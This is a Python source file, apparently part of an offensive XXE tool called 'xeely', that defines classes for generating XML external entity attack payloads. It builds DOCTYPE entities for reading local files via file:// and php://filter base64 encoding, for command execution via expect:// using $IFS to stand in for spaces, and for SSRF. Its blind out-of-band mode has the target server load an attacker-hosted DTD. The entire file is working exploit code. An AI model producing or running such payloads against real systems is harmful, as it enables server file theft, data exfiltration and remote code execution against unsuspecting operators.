from abc import ABC
from abc import abstractmethod
from typing import List
from typing import Optional
from typing import Sequence

from xeely.custom_http.server import HTTPServerParams
from xeely.custom_xml import XML
from xeely.custom_xml import XMLDoctype
from xeely.custom_xml import XMLEntity
from xeely.xxe.attack.type import XXEAttackType


class AbstractPayloadGenerator(ABC):
    MALICIOUS_ENTITY_NAME = "xxe"

    def __init__(
        self,
        base_xml: XML,
        resource: str,
        attack_type: XXEAttackType = XXEAttackType.FILE_DISCLOSURE,
        should_apply_base64_encoding: bool = False,
        should_use_cdata: bool = False,
        http_server_params: Optional[HTTPServerParams] = None,
    ):
        self._base_xml = base_xml
        self._attack_type = attack_type
        self._should_apply_base64_encoding = should_apply_base64_encoding
        self._should_use_cdata = should_use_cdata
        self._resource = resource
        self._http_server_params = http_server_params

    def does_payload_requires_to_expose_dtd_file(self) -> bool:
        return self._should_use_cdata

    def get_dtd_file_name(self) -> str:
        return "cdata.dtd"

    def _is_payload_for_blind_mode_attack(self) -> bool:
        return False

    def _get_cdata_dtd_entities(self) -> List[XMLEntity]:
        return [
            XMLEntity(
                name=self.MALICIOUS_ENTITY_NAME,
                value="%start;%exploit;%end;",
                is_parameter=self._is_payload_for_blind_mode_attack(),
            )
        ]

    def _get_payload_remote_entities(self) -> List[XMLEntity | str]:
        if self._http_server_params is None:
            return []

        dtd_file_url = f"{self._http_server_params.get_base_url()}/{self.get_dtd_file_name()}"
        return [
            XMLEntity(name="dtd", value=dtd_file_url, is_parameter=True, is_external=True),
            "%dtd;",
        ]

    def _get_base_payload_entities(
        self,
    ) -> Sequence[XMLEntity | str]:
        if self._should_use_cdata:
            entities = [
                XMLEntity(
                    name="exploit",
                    value=self._get_malicious_entity_value(),
                    is_external=True,
                    is_parameter=True,
                ),
                XMLEntity(name="start", value="<![CDATA[", is_parameter=True),
                XMLEntity(name="end", value="]]>", is_parameter=True),
                *self._get_payload_remote_entities(),
            ]
        elif self.does_payload_requires_to_expose_dtd_file():
            entities = self._get_payload_remote_entities()
        else:
            entities = [
                XMLEntity(
                    name=self.MALICIOUS_ENTITY_NAME,
                    value=self._get_malicious_entity_value(),
                    is_external=True,
                )
            ]
        return entities

    def _get_malicious_entity_value(self):
        if self._should_apply_base64_encoding:
            return f"php://filter/convert.base64-encode/resource={self._resource}"

        match self._attack_type:
            case XXEAttackType.FILE_DISCLOSURE | XXEAttackType.DIRECTORY_LISTING:
                return f"file://{self._resource}"
            case XXEAttackType.RCE:
                return f"expect://{'$IFS'.join(self._resource.split(' '))}"
            case XXEAttackType.SSRF:
                return self._resource

    def _get_payload_entities(self) -> Sequence[XMLEntity | str]:
        return self._get_base_payload_entities()

    def _modify_xml_content(self):
        entities = self._get_payload_entities()

        doctype = XMLDoctype(root_name=self._base_xml.get_root_node_name(), entities=entities)
        self._base_xml.set_doctype(doctype)

    def generate_payload(self) -> str:
        self._modify_xml_content()
        return self._base_xml.to_xml()

    def get_dtd_content(self) -> str:
        if not self.does_payload_requires_to_expose_dtd_file():
            return ""

        output = ""
        for entity in self._get_cdata_dtd_entities():
            output += f"{entity.to_xml()}\n"
        return output


class AbstractBlindPayloadGenerator(AbstractPayloadGenerator):
    def _is_payload_for_blind_mode_attack(self) -> bool:
        return True

    def does_payload_requires_to_expose_dtd_file(self) -> bool:
        return True

    @abstractmethod
    def _get_dtd_entity_value(self) -> str:
        raise NotImplementedError()

    def get_dtd_content(self) -> str:
        if self._should_use_cdata:
            content = super().get_dtd_content()
        else:
            exploit_entity = XMLEntity(
                name=self.MALICIOUS_ENTITY_NAME,
                value=self._get_malicious_entity_value(),
                is_parameter=True,
                is_external=True,
            ).to_xml()
            content = f"{exploit_entity}\n"

        entity = XMLEntity(
            name="wrapper",
            value=XMLEntity(
                name="content",
                value=self._get_dtd_entity_value(),
                is_external=True,
            )
            .to_xml()
            .replace('"', "'"),
            is_parameter=True,
        )

        return f"{content}{entity.to_xml()}\n"
